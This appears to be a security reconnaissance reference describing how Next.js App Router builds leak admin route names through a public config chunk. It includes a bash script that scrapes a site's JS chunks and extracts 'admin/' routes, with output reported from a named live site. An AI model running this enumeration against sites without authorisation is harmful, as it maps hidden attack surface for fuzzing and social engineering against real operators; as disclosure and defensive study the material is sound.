# Next.js Build Manifest Admin Route Leak — Session Reference
**Target class:** Any Next.js App Router deployment with auth-gated `/admin` group.
**Observed:** 2026-07-29 on everlyn.ai (Vercel). Pattern generalises to most
`next@14+` App Router builds.

## The Leak
`buildConfig` inside the webpack runtime config chunk is served to anonymous
visitors and enumerates internal route labels, including admin-only pages that
return 307 to `/auth/signin` when visited directly.

## Minimal Reproduction
```bash
TARGET="https://example.com"
WORKDIR="/tmp/$(echo "$TARGET" | sed 's|https\?://||;s|/||g')_static"
mkdir -p "$WORKDIR" && cd "$WORKDIR"

# 1. Pull landing page (chunk URLs live here)
curl -4 -sS -o main.html "$TARGET"

# 2. Pull every JS chunk named in the HTML
grep -oE '/_next/static/chunks/[a-zA-Z0-9_\-/\.]+\.js' main.html \
  | sort -u > chunks.txt
while read -r path; do
  fname="$(basename "$path")"
  curl -4 -sS -o "$fname" "${TARGET}${path}"
done < chunks.txt

# 3. Find the config chunk that carries buildConfig
CONFIG_JS=$(grep -l 'buildConfig' ./*.js | head -1)
echo "[*] Config chunk: $CONFIG_JS"

# 4. Dump admin route names
grep -oE '"(admin/[a-zA-Z0-9_\-]+)"' "$CONFIG_JS" | sort -u
```

## Expected Output Shape (confirmed on 2026-07-29)
```
"admin/audio_export"
"admin/export-generator"
"admin/invites"
"admin/orders"
"admin/php_exports"
"admin/resellers"
```
Even when the same request to `/admin` returns:
```
0:["$L1",["$","$L2",null,{"redirect":"/auth/signin","statusCode":307}]]
```

## Why It Matters
- Route names reveal internal tooling vocabulary (`php_exports`, `resellers`)
  that informs targeted fuzzing and social engineering.
- Confirms an authenticated `/admin` attack surface exists without creds.
- `buildConfig` is cacheable by CDN — leak persists across deploys until
  route names change.

## False-Positive Guards
- A 404 on `/_next/static/chunks/app/admin/page.js` means lazy-loaded + auth-gated;
  it does NOT mean the route is absent.
- Always cross-check with the RSC payload (`curl -H 'RSC: 1' $TARGET/admin`)
  — a `NEXT_REDIRECT` there plus a `buildConfig` entry is the confirmation pair.

## Related Skill
`security/js-secret-scanner` — section 5 (Next.js Build Manifest Mining).
